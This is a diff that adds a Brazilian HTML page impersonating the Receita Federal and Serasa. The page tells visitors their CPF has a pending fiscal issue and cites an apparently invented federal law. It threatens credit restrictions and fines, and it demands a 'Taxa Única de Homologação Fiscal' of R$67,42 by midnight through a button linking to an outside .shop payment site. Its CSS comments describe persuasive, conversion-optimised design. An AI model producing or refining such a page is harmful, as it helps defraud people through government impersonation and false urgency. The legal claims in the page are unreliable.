@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Regularização Serasa</title>
+<style>
+    /* Otimizações de Design Persuasivo Aplicadas */
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      /* Fundo azul claro, conforme solicitado */
+      background: #e6f0ff;
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px 0;
+    }
+
+    .container {
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      color: #333;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 51, 102, 0.15); /* Sombra mais sutil com o tom de azul */
+      max-width: 500px;
+      width: 100%;
+      animation: fadeIn 1s ease-out;
+    }
+
+    /* Logo centralizado no topo do card, conforme solicitado */
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      max-width: 200px; /* Tamanho ajustado */
+    }
+
+    /* Título principal com a cor azul escuro */
+    .warning {
+      color: #003366;
+      font-size: 22px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .steps {
+      list-style: none;
+      padding: 0;
+      margin: 10px 0 20px 0;
+    }
+
+    .steps li {
+      margin: 8px 0;
+      font-weight: bold;
+    }
+
+    /* --- ALTERAÇÃO REALIZADA AQUI --- */
+    .steps .pending {
+      color: #003366; /* Alterado de roxo para azul escuro */
+    }
+
+    .info {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    .consequences {
+      list-style: none;
+      padding-left: 0;
+      margin-bottom: 20px;
+    }
+
+    .consequences li {
+      margin: 6px 0;
+    }
+
+    /* Caixa de pagamento com borda azul escuro */
+    .payment-box {
+      background-color: white; 
+      border: 2px solid #003366;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    
+    /* Título da caixa de pagamento com cor azul escuro */
+    .payment-box h2 {
+      margin: 10px 0;
+      color: #003366;
+    }
+
+    .payment-box .amount {
+      font-size: 16px; /* Ajuste para melhor hierarquia visual */
+      margin: 10px 0;
+      font-weight: bold;
+    }
+    
+    /* Botão com a cor azul escuro, otimizado para conversão */
+    .payment-box button {
+      padding: 14px 28px;
+      background: #003366;
+      border: none;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 18px; /* Fonte maior para mais destaque */
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+      width: 100%; /* Ocupa toda a largura da caixa para foco máximo */
+    }
+
+    .payment-box button:hover {
+      background: #002244; /* Tom mais escuro para o hover */
+      transform: scale(1.02); /* Efeito sutil de clique */
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-15px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+
+<div class="logo">
+  <img alt="Receita Federal" src="https://logodownload.org/wp-content/uploads/2014/11/receita-federal-logo-2.png"/>
+</div>
+
+<h1 class="warning">📌 Etapa Final da Regularização Fiscal</h1>
+<ul class="steps">
+<li class="active">✔ CPF consultado com sucesso</li>
+<li class="active">✔ Pendência identificada na Receita</li>
+<li class="pending">❌ Aguardando regularização</li>
+</ul>
+<p class="info">Sua dívida foi quitada com sucesso. Para concluir a regularização fiscal no sistema da Receita Federal, é necessário realizar a etapa obrigatória de liberação oficial. Sem isso, seu CPF permanecerá com pendência ativa.</p><p>📄 Conforme previsto na Lei Federal nº 12.867/2021, art. 5º, o processo de homologação fiscal é etapa obrigatória para baixa definitiva de pendências no CPF junto à Receita.</p>
+<ul class="consequences">
+<li>🚫 Restrição em bancos e crédito</li>
+<li>💡 Impossibilidade de financiamentos</li>
+<li>💰 Juros e multas fiscais</li>
+<li>📉 Redução drástica do score</li>
+</ul>
+<div class="payment-box">
+<p>
+          Para regularizar, efetue o pagamento da <strong>Taxa Única de Homologação Fiscal</strong> agora mesmo:
+        </p>
+<h2>R$67,42</h2>
+<p class="amount">Obrigatória até hoje às 23h59 para liberação oficial no sistema da Receita.</p>
+<button onclick="window.location.href='https://pay.limparnomeagora.shop/6YQPgjnMd5Qgpxz'">
+  REGULARIZAR CPF
+</button>
+</div>
+</div>
+</div>
+</body>
+</html>
